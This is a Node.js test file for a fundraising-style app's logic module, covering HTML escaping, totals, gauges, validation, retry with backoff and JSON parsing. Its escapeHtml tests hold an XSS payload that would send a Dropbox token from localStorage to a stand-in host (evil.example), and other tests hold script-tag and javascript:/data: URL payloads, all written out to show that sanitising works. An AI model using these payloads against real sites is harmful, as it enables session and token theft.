const test = require('node:test');
const assert = require('node:assert/strict');
const {
    escapeHtml,
    computeTotals,
    sortEntitiesByTotal,
    computeBarPercentage,
    computeGaugeGeometry,
    isDuplicateName,
    isValidTransactionAmount,
    isAllowedMediaUrl,
    computeRetryDelay,
    runUpdateWithRetry,
    computeMaxVisibleRows,
    validateAppDataShape,
    parseAppDataJson
} = require('../js/logic.js');

test('escapeHtml', async (t) => {
    await t.test('escapes the five HTML metacharacters', () => {
        assert.equal(escapeHtml(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
    });

    await t.test('neutralizes an attribute-breakout XSS payload', () => {
        const payload = `x" onerror="fetch('https://evil.example/?t='+localStorage.dropbox_token)`;
        const escaped = escapeHtml(payload);
        assert.ok(!escaped.includes('"'), 'no raw quote should survive to close the attribute');
        assert.equal(escaped, 'x&quot; onerror=&quot;fetch(&#39;https://evil.example/?t=&#39;+localStorage.dropbox_token)');
    });

    await t.test('neutralizes a script-tag injection payload', () => {
        const escaped = escapeHtml('<script>alert(1)</script>');
        assert.ok(!escaped.includes('<script>'));
        assert.equal(escaped, '&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    await t.test('handles null/undefined/number input without throwing', () => {
        assert.equal(escapeHtml(null), '');
        assert.equal(escapeHtml(undefined), '');
        assert.equal(escapeHtml(42), '42');
    });

    await t.test('leaves ordinary text untouched', () => {
        assert.equal(escapeHtml('Team Alpha'), 'Team Alpha');
    });
});

test('computeTotals', async (t) => {
    const entities = [{ id: 'e1' }, { id: 'e2' }];

    await t.test('sums amounts per entity for the given event only', () => {
        const transactions = [
            { entityId: 'e1', eventId: 'evt1', amount: 10 },
            { entityId: 'e1', eventId: 'evt1', amount: 5.5 },
            { entityId: 'e2', eventId: 'evt1', amount: 3 },
            { entityId: 'e1', eventId: 'evt2', amount: 999 } // different event, must be excluded
        ];
        const totals = computeTotals(entities, transactions, 'evt1');
        assert.equal(totals.e1, 15.5);
        assert.equal(totals.e2, 3);
    });

    await t.test('entities with no transactions total 0', () => {
        const totals = computeTotals(entities, [], 'evt1');
        assert.deepEqual(totals, { e1: 0, e2: 0 });
    });

    await t.test('ignores transactions referencing an unknown entity', () => {
        const transactions = [{ entityId: 'ghost', eventId: 'evt1', amount: 100 }];
        const totals = computeTotals(entities, transactions, 'evt1');
        assert.deepEqual(totals, { e1: 0, e2: 0 });
    });

    await t.test('handles missing/empty inputs', () => {
        assert.deepEqual(computeTotals([], [], 'evt1'), {});
        assert.deepEqual(computeTotals(undefined, undefined, 'evt1'), {});
    });
});

test('sortEntitiesByTotal', async (t) => {
    await t.test('orders entities highest total first', () => {
        const entities = [{ id: 'a' }, { id: 'b' }, { id: 'c' }];
        const totals = { a: 5, b: 50, c: 20 };
        const sorted = sortEntitiesByTotal(entities, totals);
        assert.deepEqual(sorted.map((e) => e.id), ['b', 'c', 'a']);
    });

    await t.test('does not mutate the input array', () => {
        const entities = [{ id: 'a' }, { id: 'b' }];
        const totals = { a: 1, b: 2 };
        sortEntitiesByTotal(entities, totals);
        assert.deepEqual(entities.map((e) => e.id), ['a', 'b']);
    });

    await t.test('treats a missing total as 0', () => {
        const entities = [{ id: 'a' }, { id: 'b' }];
        const sorted = sortEntitiesByTotal(entities, {});
        assert.equal(sorted.length, 2);
    });
});

test('computeBarPercentage', async (t) => {
    await t.test('computes a normal percentage', () => {
        assert.equal(computeBarPercentage(25, 100), 25);
    });

    await t.test('clamps above 100', () => {
        assert.equal(computeBarPercentage(150, 100), 100);
    });

    await t.test('returns 0 when maxTotal is 0 or falsy (no divide-by-zero NaN)', () => {
        assert.equal(computeBarPercentage(10, 0), 0);
        assert.equal(computeBarPercentage(10, null), 0);
    });
});

test('computeGaugeGeometry', async (t) => {
    const dashArray = 125.66;

    await t.test('50% raised maps to half the dash array offset', () => {
        const { percentage, dashOffset } = computeGaugeGeometry(50, 100, dashArray);
        assert.equal(percentage, 50);
        assert.ok(Math.abs(dashOffset - dashArray / 2) < 0.001);
    });

    await t.test('clamps over-goal raises at 100%', () => {
        const { percentage, dashOffset } = computeGaugeGeometry(500, 100, dashArray);
        assert.equal(percentage, 100);
        assert.equal(dashOffset, 0);
    });

    await t.test('no/zero goal renders an empty gauge instead of NaN', () => {
        const { percentage, dashOffset } = computeGaugeGeometry(50, null, dashArray);
        assert.equal(percentage, 0);
        assert.equal(dashOffset, dashArray);
        assert.ok(!Number.isNaN(dashOffset));
    });
});

test('isDuplicateName', async (t) => {
    const entities = [
        { id: 'e1', namePublic: 'Team Alpha' },
        { id: 'e2', namePublic: 'Team Beta' }
    ];

    await t.test('is case-insensitive and trim-insensitive', () => {
        assert.equal(isDuplicateName(entities, '  team alpha  '), true);
        assert.equal(isDuplicateName(entities, 'TEAM BETA'), true);
    });

    await t.test('returns false for a genuinely new name', () => {
        assert.equal(isDuplicateName(entities, 'Team Gamma'), false);
    });

    await t.test('excludeId lets an entity keep its own name while editing', () => {
        assert.equal(isDuplicateName(entities, 'Team Alpha', 'e1'), false);
        assert.equal(isDuplicateName(entities, 'Team Alpha', 'e2'), true);
    });
});

test('isValidTransactionAmount', async (t) => {
    await t.test('accepts a positive finite number', () => {
        assert.equal(isValidTransactionAmount(0.01), true);
        assert.equal(isValidTransactionAmount(50), true);
    });

    await t.test('rejects zero and negative amounts', () => {
        assert.equal(isValidTransactionAmount(0), false);
        assert.equal(isValidTransactionAmount(-5), false);
    });

    await t.test('rejects NaN and non-finite values', () => {
        assert.equal(isValidTransactionAmount(NaN), false);
        assert.equal(isValidTransactionAmount(Infinity), false);
        assert.equal(isValidTransactionAmount(-Infinity), false);
    });

    await t.test('rejects non-number types', () => {
        assert.equal(isValidTransactionAmount('50'), false);
        assert.equal(isValidTransactionAmount(null), false);
        assert.equal(isValidTransactionAmount(undefined), false);
    });
});

test('isAllowedMediaUrl', async (t) => {
    await t.test('treats an empty/absent URL as allowed (optional field)', () => {
        assert.equal(isAllowedMediaUrl(''), true);
        assert.equal(isAllowedMediaUrl(undefined), true);
        assert.equal(isAllowedMediaUrl(null), true);
    });

    await t.test('accepts http and https URLs', () => {
        assert.equal(isAllowedMediaUrl('https://example.com/logo.png'), true);
        assert.equal(isAllowedMediaUrl('http://example.com/logo.png'), true);
    });

    await t.test('rejects javascript: and data: schemes', () => {
        assert.equal(isAllowedMediaUrl('javascript:alert(1)'), false);
        assert.equal(isAllowedMediaUrl('data:text/html,<script>alert(1)</script>'), false);
    });

    await t.test('rejects malformed and relative input', () => {
        assert.equal(isAllowedMediaUrl('not a url'), false);
        assert.equal(isAllowedMediaUrl('/relative/path.png'), false);
    });
});

test('computeRetryDelay', async (t) => {
    await t.test('grows exponentially with attempt number', () => {
        assert.equal(computeRetryDelay(1, 250, 4000), 250);
        assert.equal(computeRetryDelay(2, 250, 4000), 500);
        assert.equal(computeRetryDelay(3, 250, 4000), 1000);
    });

    await t.test('is capped so retries cannot grow unbounded', () => {
        assert.equal(computeRetryDelay(10, 250, 4000), 4000);
    });
});

test('runUpdateWithRetry', async (t) => {
    const noDelay = () => Promise.resolve();

    await t.test('happy path: fetch, mutate, save once, succeed', async () => {
        const calls = [];
        const result = await runUpdateWithRetry({
            fetchState: async () => calls.push('fetch'),
            updateFn: () => calls.push('update'),
            saveState: async () => { calls.push('save'); return true; },
            delay: noDelay
        });
        assert.equal(result.status, 'success');
        assert.deepEqual(calls, ['fetch', 'update', 'save']);
    });

    await t.test('a failed initial fetch aborts before mutating — no duplicate writes', async () => {
        let updateCalled = false;
        let saveCalled = false;
        const result = await runUpdateWithRetry({
            fetchState: async () => { throw new Error('network down'); },
            updateFn: () => { updateCalled = true; },
            saveState: async () => { saveCalled = true; return true; },
            delay: noDelay
        });
        assert.equal(result.status, 'fetch-failed');
        assert.equal(updateCalled, false, 'updateFn must not run against un-refreshed state');
        assert.equal(saveCalled, false);
    });

    await t.test('a fetch failure during a retry also aborts without re-mutating', async () => {
        let fetchCalls = 0;
        let updateCalls = 0;
        const result = await runUpdateWithRetry({
            fetchState: async () => {
                fetchCalls++;
                if (fetchCalls === 2) throw new Error('network blip mid-retry');
            },
            updateFn: () => { updateCalls++; },
            saveState: async () => false, // always conflicts, forcing a retry
            delay: noDelay,
            maxAttempts: 5
        });
        assert.equal(result.status, 'fetch-failed');
        assert.equal(fetchCalls, 2);
        assert.equal(updateCalls, 1, 'updateFn must not run again after the retry fetch failed');
    });

    await t.test('409 conflicts retry with backoff and eventually succeed', async () => {
        let saveAttempts = 0;
        let fetchCalls = 0;
        let updateCalls = 0;
        const delays = [];
        const result = await runUpdateWithRetry({
            fetchState: async () => { fetchCalls++; },
            updateFn: () => { updateCalls++; },
            saveState: async () => { saveAttempts++; return saveAttempts >= 3; },
            delay: async (ms) => { delays.push(ms); },
            maxAttempts: 5
        });
        assert.equal(result.status, 'success');
        assert.equal(saveAttempts, 3);
        assert.equal(fetchCalls, 3, 'one initial fetch plus one re-fetch per retry before the successful save');
        assert.equal(updateCalls, 3, 'updateFn must be re-applied against fresh state on every retry');
        assert.deepEqual(delays, [250, 500]);
    });

    await t.test('gives up cleanly after maxAttempts instead of retrying forever', async () => {
        let saveAttempts = 0;
        const result = await runUpdateWithRetry({
            fetchState: async () => {},
            updateFn: () => {},
            saveState: async () => { saveAttempts++; return false; },
            delay: noDelay,
            maxAttempts: 3
        });
        assert.equal(result.status, 'conflict-exhausted');
        assert.equal(saveAttempts, 3);
    });

    await t.test('a thrown saveState (e.g. 401) is reported as save-failed, not retried as a conflict', async () => {
        let saveAttempts = 0;
        let delayCalls = 0;
        const authError = new Error('Unauthorized');
        const result = await runUpdateWithRetry({
            fetchState: async () => {},
            updateFn: () => {},
            saveState: async () => { saveAttempts++; throw authError; },
            delay: async () => { delayCalls++; },
            maxAttempts: 5
        });
        assert.equal(result.status, 'save-failed');
        assert.equal(result.error, authError);
        assert.equal(saveAttempts, 1, 'must not retry after a save failure that is not a conflict');
        assert.equal(delayCalls, 0, 'must not wait on a backoff delay for a non-retryable failure');
    });
});

test('computeMaxVisibleRows', async (t) => {
    await t.test('computes how many whole rows fit including inter-row gaps', () => {
        // 5 rows of 80px + 12px gaps fit exactly in 5*80 + 4*12 = 448px
        assert.equal(computeMaxVisibleRows(448, 80, 12), 5);
    });

    await t.test('floors to the last row that fully fits, never a partial row', () => {
        assert.equal(computeMaxVisibleRows(447, 80, 12), 4);
    });

    await t.test('always shows at least 1 row even if nothing fits', () => {
        assert.equal(computeMaxVisibleRows(10, 80, 12), 1);
    });

    await t.test('falls back to unlimited (Infinity) when row height cannot be measured', () => {
        assert.equal(computeMaxVisibleRows(500, 0, 12), Infinity);
        assert.equal(computeMaxVisibleRows(500, -5, 12), Infinity);
    });

    await t.test('treats a missing gap as 0', () => {
        assert.equal(computeMaxVisibleRows(400, 100), 4);
    });
});

test('validateAppDataShape', async (t) => {
    const validData = { settings: {}, events: [], entities: [], transactions: [] };

    await t.test('accepts a well-formed appData object', () => {
        assert.deepEqual(validateAppDataShape(validData), { valid: true });
    });

    await t.test('rejects a non-object root (array, string, null, number)', () => {
        assert.equal(validateAppDataShape([]).valid, false);
        assert.equal(validateAppDataShape('nope').valid, false);
        assert.equal(validateAppDataShape(null).valid, false);
        assert.equal(validateAppDataShape(42).valid, false);
    });

    await t.test('rejects when an array field is missing or the wrong type', () => {
        for (const field of ['events', 'entities', 'transactions']) {
            const broken = { ...validData, [field]: 'not-an-array' };
            const result = validateAppDataShape(broken);
            assert.equal(result.valid, false);
            assert.match(result.error, new RegExp(field));
        }
    });

    await t.test('rejects a non-object settings field', () => {
        const broken = { ...validData, settings: [] };
        assert.equal(validateAppDataShape(broken).valid, false);
    });
});

test('parseAppDataJson', async (t) => {
    await t.test('parses and accepts valid, well-formed JSON', () => {
        const json = JSON.stringify({ settings: { title: 'X' }, events: [], entities: [], transactions: [] });
        const result = parseAppDataJson(json);
        assert.equal(result.valid, true);
        assert.equal(result.data.settings.title, 'X');
    });

    await t.test('reports a syntax error for malformed JSON without throwing', () => {
        const result = parseAppDataJson('{ this is not valid json');
        assert.equal(result.valid, false);
        assert.match(result.error, /Invalid JSON/);
    });

    await t.test('reports a shape error for syntactically valid but wrong-shaped JSON', () => {
        const result = parseAppDataJson('[1, 2, 3]');
        assert.equal(result.valid, false);
        assert.match(result.error, /object/);
    });

    await t.test('reports a shape error for JSON missing a required array field', () => {
        const result = parseAppDataJson(JSON.stringify({ settings: {}, entities: [], transactions: [] }));
        assert.equal(result.valid, false);
        assert.match(result.error, /events/);
    });
});
